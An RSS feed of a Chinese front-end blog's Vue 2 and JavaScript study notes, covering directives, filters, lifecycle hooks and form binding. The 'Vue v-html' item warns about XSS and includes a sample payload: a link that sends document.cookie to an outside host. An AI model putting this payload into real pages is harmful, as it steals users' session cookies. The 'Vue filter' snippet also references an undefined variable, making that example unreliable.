<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>前端 on Rainy · Blog</title>
    <link>https://yxzi.xyz/tags/%E5%89%8D%E7%AB%AF/</link>
    <description>Recent content in 前端 on Rainy · Blog</description>
    <image>
      <url>https://yxzi.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://yxzi.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 23 May 2022 06:00:00 +0000</lastBuildDate><atom:link href="https://yxzi.xyz/tags/%E5%89%8D%E7%AB%AF/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Vue 组件</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6/</link>
      <pubDate>Mon, 23 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%BB%84%E4%BB%B6/%E7%BB%84%E4%BB%B6/</guid>
      <description>组件 用来实现局部（特定）功能效果的代码集合。
非单文件组件 一个文件中包含 N 个组件。
单文件组件 一个文件中只包含 1 个组件。</description>
    </item>
    
    <item>
      <title>JavaScrip debugger</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%AF%AD%E5%8F%A5%E5%92%8C%E5%A3%B0%E6%98%8E/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%AF%AD%E5%8F%A5%E5%92%8C%E5%A3%B0%E6%98%8E/</guid>
      <description>debugger debugger 被调用时, 浏览器执行 JavaScrip 代码时会暂停在 debugger 语句的位置，并调用 (如果有) 浏览器的调试器进行调试。例如设置断点。</description>
    </item>
    
    <item>
      <title>JavaScript HTMLElement 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/element/htmlelement/htmlelement/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/element/htmlelement/htmlelement/</guid>
      <description>HTMLElement 方法 focus() 如果可以，将焦点聚焦在指定的元素上。
如果是创建的新元素，则必须先将创建的新元素插入到页面中，然后再执行focus()，焦点才能成功聚焦到这个新元素上。如果是先聚焦，再插入，焦点则不会聚焦到新元素上。</description>
    </item>
    
    <item>
      <title>Vue directive</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/directive/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/directive/</guid>
      <description>directive 全局自定义指令。不同 Vue 实例都可以通用的自定义指令。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h2&amp;gt;当前 n 的值为：{{n}}&amp;lt;/h2&amp;gt;  &amp;lt;h2&amp;gt;放大 100 倍的值：&amp;lt;/h2&amp;gt;&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; v-focus-bind=&amp;#34;n&amp;#34;&amp;gt;  &amp;lt;button @click=&amp;#34;n++&amp;#34;&amp;gt;点击后 n++&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScript
// 全局自定义指令 Vue.directive(&amp;#39;focus-bind&amp;#39;, { 	bind(element, binding) { 	element.value = binding.value; 	}, 	inserted(element, binding) { 	element.focus(); 	}, 	update(element, binding) { 	element.value = binding.value * 100; 	}, }); var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	n: 1, 	}, });  Vue.</description>
    </item>
    
    <item>
      <title>Vue directives</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/directives/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/directives/</guid>
      <description>directives 局部自定义指令，一个指令就是一个函数或对象。
directives中出现的this 都指向 Window。
函数式 函数中有两个参数：
 element：指令所在的 DOM 元素。 binding：一个对象，其中的value 属性就是自定义指令的属性值。  会在什么时候被调用？   指令与元素绑定成功时（初始化）会被调用。但此时元素还没有被 Vue 解析并插入到页面，这会导致在directives中，某些方法不能及时的生效。比如focus()。
  指令所在的模板被重新解析时。
  HTML
 &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h2&amp;gt;当前 n 的值为：{{n}}&amp;lt;/h2&amp;gt;  &amp;lt;h3&amp;gt;放大十倍后的 n 为 ：&amp;lt;span v-big=&amp;#34;n&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt;  &amp;lt;button @click=&amp;#34;n++&amp;#34;&amp;gt;点击后 n++&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	n: 1, 	}, 	directives: { 	big(element, binding) { 	element.innerText = binding.</description>
    </item>
    
    <item>
      <title>Vue v-cloak</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-cloak/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-cloak/</guid>
      <description>v-cloak 一个没有值的指令。通常配合 CSS 一起用，可以隐藏未经 Vue 解析且带有{{}}的元素，直到 Vue 实例创建完毕。
Vue 实例创建完毕后，元素上的 v-cloak被删除。
HTML
&amp;lt;div v-cloak&amp;gt;  {{ message }} &amp;lt;/div&amp;gt; CSS
[v-cloak] {  display: none; } 该div不会显示，直到 Vue 实例创建完毕。</description>
    </item>
    
    <item>
      <title>Vue v-html</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-html/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-html/</guid>
      <description>v-html 设置元素的 innerHTML，会覆盖元素中的所有内容。但与v-text不同的是，它会识别 HTML 元素
安全性 在网站上动态渲染任意 HTML 是非常危险的，因为容易导致 XSS 攻击。只在可信内容上使用 v-html，永不用在用户提交的内容上。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;div v-html=&amp;#34;msg&amp;#34;&amp;gt;原内容&amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({el: &amp;#39;#app&amp;#39;,data: {msg: &amp;#39;&amp;lt;a href=javascript:location.href=&amp;#34;http://www.baidu.com?&amp;#34; + document.cookie&amp;gt;XXS 攻击&amp;lt;/a&amp;gt; &amp;#39;,},});Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue v-once</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-once/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-once/</guid>
      <description>v-once 一个没有值的指令。只渲染当前元素一次。之后该元素被视为静态内容。可以用于优化性能。</description>
    </item>
    
    <item>
      <title>Vue v-pre</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-pre/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-pre/</guid>
      <description>v-pre 跳过当前元素和它的子元素的编译过程。使页面显示原始 Mustache 元素。
用于跳过大量没有使用指令的元素，这会加快编译速度。</description>
    </item>
    
    <item>
      <title>Vue v-text</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-text/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-text/</guid>
      <description>v-text 设置元素的文本内容。会覆盖元素中的所有内容。</description>
    </item>
    
    <item>
      <title>Vue 实例方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</guid>
      <description>实例方法 </description>
    </item>
    
    <item>
      <title>Vue 生命周期函数</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/</guid>
      <description>生命周期函数 在 Vue 的创建、使用、销毁过程中，会有许多事件，这些事件就被统称为生命周期函数，也叫作生命周期钩子。
生命周期函数的名字不可更改，但函数中的代码由我们自定义。
生命周期函数中的 this 的指向是 Vue 实例或组件实例对象。
beforeCreate() 在实例初始化之后，进行数据侦听和数据代理之前调用
created() 在实例创建完成后被立即同步调用。在这一步中，实例已完成对选项的处理，意味着以下内容已被配置完毕：数据侦听、计算属性、方法、事件/侦听器的回调函数。然而，挂载阶段还没开始，
beforeMount() 在挂载开始之前被调用。
mounted() 把初始的真实 DOM 树插入到页面后，即 Vue 实例挂载完毕后调用。
此时一般开始发送 Ajax 请求、启动定时器、绑定自定义事件、订阅消息等初始化操作。
beforeUpdate 在数据发生改变后，DOM 被更新之前被调用。此时的数据已经被改变，但页面中不是最新的数据。
updated() 此时的数据已经被改变，且页面中也是最新的数据。
beforeDestroy() 实例销毁之前调用。在这一步，实例仍然完全可用。但无法引起页面中的数据更新。
此时一般开始清除定时器、解绑自定义事件、取消订阅消息等收尾操作。
一般不在该流程操作数据，因为在此时改变数据，并不会引起页面中的数据更新。
destroyed() 实例销毁后调用。</description>
    </item>
    
    <item>
      <title>Vue 生命周期流程</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%B5%81%E7%A8%8B/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%B5%81%E7%A8%8B/</guid>
      <description>生命周期流程 flowchart TD;newVue[&amp;#34;new Vue()&amp;#34;] --&amp;gt; init[&amp;#34;初始化：事件、生命周期、但数据代理未开始。&amp;#34;];init --&amp;gt; beforeCraeate[&amp;#34;beforeCraeate()：此时无法通过 vm 访问 data 中的数据，以及 methods 中的方法。&amp;#34;];beforeCraeate --&amp;gt; againInit[&amp;#34;初始化：数据检测、数据代理。&amp;#34;];againInit ---&amp;gt;created[&amp;#34;created()：可以通过 vm 访问到 data 中的数据，以及 methods 中的方法。&amp;#34;];created --&amp;gt; 挂载流程开始挂载流程开始 --&amp;gt; el[&amp;#34;是否配置 el 选项？&amp;#34;]el --&amp;gt;|Yse| template[&amp;#34;是否配置 template 选项？&amp;#34;];el --&amp;gt;|No| $mount[&amp;#34;当 vm.$mount(el) 调用的时候&amp;#34;];$mount --&amp;gt;template;template --&amp;gt;|Yes| compileTemplate[&amp;#34;编译 template 到 render() 中&amp;#34;]compileTemplate --&amp;gt;stageOnetemplate --&amp;gt;|No|compileEl[&amp;#34;编译 el 指定元的outerHTML 作为 template&amp;#34;];compileEl --&amp;gt; stageOne[&amp;#34;此阶段 Vue 开始解析模板，生成虚拟 DOM（内存中），但页面还无法显示解析好的内容。&amp;#34;]stageOne ---&amp;gt;beforeMount[&amp;#34;beforeMount()：此时，页面呈现的是未经 Vue 编译的 DOM 结构。&amp;lt;/br&amp;gt; 此时，所有对 DOM 的操作，最终都没有效果（在 beforeMount 之前才有效果）。&amp;#34;];beforeMount --&amp;gt; $el[&amp;#34;将内存中的虚拟 DOM 转化为真实 DOM 插入到页面。（还将真实 DOM 拷贝了一份在 $el 中）&amp;#34;]$el --&amp;gt; mouted[&amp;#34;mouted()：页面中呈现的都是经过 Vue 编译到 DOM。&amp;lt;/br&amp;gt; 对 DOM 的操作均有效（但尽可能避免），至此初始化过程结束，一般在此进行：开启定时器、发送网络请求、订阅消息、绑定自定义事件等初始化操作。&amp;#34;]mouted ---&amp;gt;mountEnd[&amp;#34;mouted()：此时，挂载流程结束。更新流程开始&amp;#34;];mountEnd --&amp;gt; changes[&amp;#34;当 data 中的数据发生变化&amp;#34;];changes --&amp;gt; beforeUpdate[&amp;#34;beforeUpdate()：此时，data 中的数据是新的，但页面中的数据是旧的，即：页面尚未和最新的数据保持同步。&amp;#34;];beforeUpdate --&amp;gt; compareVNode[&amp;#34;根据新数据，生成新的虚拟 DOM，随后与旧的虚拟DOM进行比对，最终完成页面更新，即：完成了 Model —&amp;gt; view 的更新&amp;#34;];compareVNode --&amp;gt; updated[&amp;#34;updated()：此时，数据和页面都是最新的（方法和数据都可用，且能引起页面上的数据更新），即：页面和数据保持同步。&amp;#34;];updated --&amp;gt; mountEnd;updated ---&amp;gt; $destroy[&amp;#34;vm.</description>
    </item>
    
    <item>
      <title>Vue 自定义指令</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</guid>
      <description>自定义指令 定义指令时，指令名不加v-，使用的时候需要加v-。
指令名如果是多个单词，多个单词用-隔开。</description>
    </item>
    
    <item>
      <title>JavaScript Math 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sat, 21 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math-%E6%96%B9%E6%B3%95/</guid>
      <description>Math 方法 random() 返回一个 0（= 0）到 1（&amp;lt; 1）的随机数。
floor() 向下取整，返回一个小于或等于指定数字的最大整数。
ceil() 向上取整，返回一个大于或等于指定数字的最小整数。</description>
    </item>
    
    <item>
      <title>Vue filter</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/filter/</link>
      <pubDate>Sat, 21 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/filter/</guid>
      <description>filter 全局过滤器，不同 Vue 实例都可以通用的过滤器。
当全局过滤器和局部过滤器重名时，会采用局部过滤器。
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://unpkg.com/dayjs@1.8.21/dayjs.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;全局过滤器&amp;lt;/title&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;!-- 全局过滤器 --&amp;gt;  &amp;lt;h3 v-bind:id=&amp;#34;msg | mySlice&amp;#34;&amp;gt;全局过滤器&amp;lt;/h3&amp;gt;  &amp;lt;/div&amp;gt;  &amp;lt;/body&amp;gt;  &amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;/html&amp;gt; JavaScript
// 全局过滤器 Vue.filter(&amp;#39;mySlice&amp;#39;, function () { 	return val.</description>
    </item>
    
    <item>
      <title>Vue filters</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/filters/</link>
      <pubDate>Sat, 21 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/filters/</guid>
      <description>filters 局部过滤器，只能在啊当前 Vue 实例中使用的过滤器。它将|之前的数据当作参数，并传递给在|之后的过滤函数，并作为该过滤函数的参数。
过滤函数的返回值会被作为最终值解析到模板中。
传参 过滤函数除了可以将在|之前的数据当作第一个实参时，还能接受额外的其他参数。
串联 过滤器中的多个过滤函数可以串联，用|将不同的过滤器函数分开，前一个函数的返回值会被当作后一个函数的实参。
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://unpkg.com/dayjs@1.8.21/dayjs.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;j&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;   &amp;lt;/style&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;!-- 过滤器 --&amp;gt;  &amp;lt;h3&amp;gt;Vue - filters：{{time | timeFmt}}&amp;lt;/h3&amp;gt;  &amp;lt;!-- 过滤器地传参 --&amp;gt;  &amp;lt;h3&amp;gt;Vue - filters：{{time | timeFmt(&amp;#39;YYYY——MM——DD&amp;#39;)}}&amp;lt;/h3&amp;gt;  &amp;lt;!</description>
    </item>
    
    <item>
      <title>Vue 过滤器</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/%E8%BF%87%E6%BB%A4%E5%99%A8/</link>
      <pubDate>Sat, 21 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/%E8%BF%87%E6%BB%A4%E5%99%A8/</guid>
      <description>过滤器 对数据进行格式化后再显示。
一般用在{{}}或v-bind之中，
过滤器不会改变原来的数据。</description>
    </item>
    
    <item>
      <title>HTML input</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/input/</link>
      <pubDate>Fri, 20 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/input/</guid>
      <description>input 输入框。
为input 设置不同的 type 属性，可以变化为多种形态。
radio 单选框。
需要为多个单选按钮设置相同的 name 值。
性别： &amp;lt;input type=&amp;#34;radio&amp;#34; name=&amp;#34;sex&amp;#34; id=&amp;#34;&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;radio&amp;#34; name=&amp;#34;sex&amp;#34; id=&amp;#34;&amp;#34;&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 修饰符</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</link>
      <pubDate>Fri, 20 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</guid>
      <description>修饰符 lazy 默认情况下，v-model会实时的同步元素中的数据，但如果添加了lazy，则数据会在当前元素失去焦点的时候同步元素中的数据。
trim 自动过滤输入框中的首尾空白字符。
number 自动将输入框中的内容转为数值类型。
通常是将字符串转换为数值。</description>
    </item>
    
    <item>
      <title>Vue v-model</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/v-model/</link>
      <pubDate>Thu, 19 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/v-model/</guid>
      <description>v-model 双向数据绑定，常用于表单元素（有 value 值）。
双向绑定是指：数据不仅能从 data 流向页面，也能从页面流向 data。
该指令是v-on与v-bind的复合版。
&amp;lt;!-- 类似于语法糖的写法 --&amp;gt; &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h1&amp;gt;{{text}}&amp;lt;/h1&amp;gt;  &amp;lt;input type=&amp;#34;text&amp;#34; v-model=&amp;#34;text&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;!-- 相当于这样写--&amp;gt; &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h1&amp;gt;{{text}}&amp;lt;/h1&amp;gt;  &amp;lt;input type=&amp;#34;text&amp;#34; :value=&amp;#34;text&amp;#34; @input=&amp;#34;text = $event.target.value&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 收集表单数据</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Thu, 19 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/</guid>
      <description>收集表单数据 用 v-model 在表单 input textarea及 select 上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。
type = radio 则v-mode1收 集的是value值，且要给不同的&amp;lt;input type=&amp;quot;radio&amp;quot; /&amp;gt;配置 相同的value 值。
type = checkbox  没有配置 input 的value属性，那么v-mode1收集的就是一个布尔值（勾选 or 未勾选，） 配置input的value属性:  v- mode1的初始值是非数组，那么收集的就是布尔值（勾选 or 未勾选） v-mode1的初始值是数组，那么v-mode1收集的的就是value的属性值所组成的数组。    备注: v-mode1的 三个修饰符:
 lazy:失去焦点再收集数据 number:输入字符串转为有效的数字 trim:输入首尾空格过滤  HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;学习&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;   &amp;lt;/style&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;form&amp;gt;  账号：&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; v-model.</description>
    </item>
    
    <item>
      <title>Vue 数据响应式</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/</link>
      <pubDate>Thu, 19 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/</guid>
      <description>数据响应式 Vue 会监视 data 中所有层级的数据。
数据劫持 指的是在访问或者修改对象的某个属性时，通过一段代码拦截这个行为，进行额外的操作或者修改返回结果。
在 Vue 中，是通过给对象添加一个setter()来实现的数据劫持这个行为的。
如何响应对象中的数据？ 通过 setter()实现响应，且要在 nwe Vue 时就传入要响应的数据。
 new Vue 之后再追加的对象属性，Vue 默认不响应。 若需要让 Vue 响应 new Vue 之后追加的对象属性，需要使用 Vue.set()或则 vm.$set()  如何响应数组中的数据？ 通过包裹数组更新元素的方法实现：
 调用原生更新元素的方法实现对数组进行更新。 重新解析模板，进而更新页面。  原生数组被包裹的方法有：
 push() pop() shift() unshift() splice() sort() reverse()  只要使用以上方法更新数组中的元素，那么就可以实现响应数组中的数据。
不完整的数据响应式实现 // 模仿 Vue 实现响应式的过程， // 缺陷一：无法直接 vm.attr // 缺陷二：多层级的属性无法被监听到 var data = { 	name: &amp;#39;黔灵山&amp;#39;, 	address: &amp;#39;贵阳&amp;#39;, 	age: 35, };  // 创建一个监视的实例对象，用于监视 data 中属性的变化  var obs = new Observer(data);  // 此时 data 中有的属性，obs 中都有。  // 定义一个 vm 实例对象 var vm = {}; vm.</description>
    </item>
    
    <item>
      <title>Vue Class 与 Style 绑定</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/class-%E4%B8%8E-style-%E7%BB%91%E5%AE%9A/</link>
      <pubDate>Wed, 18 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/class-%E4%B8%8E-style-%E7%BB%91%E5%AE%9A/</guid>
      <description>Class 与 Style 绑定 绑定 Class 字符串 适合场景：类名不确定，且需要要动态获取。
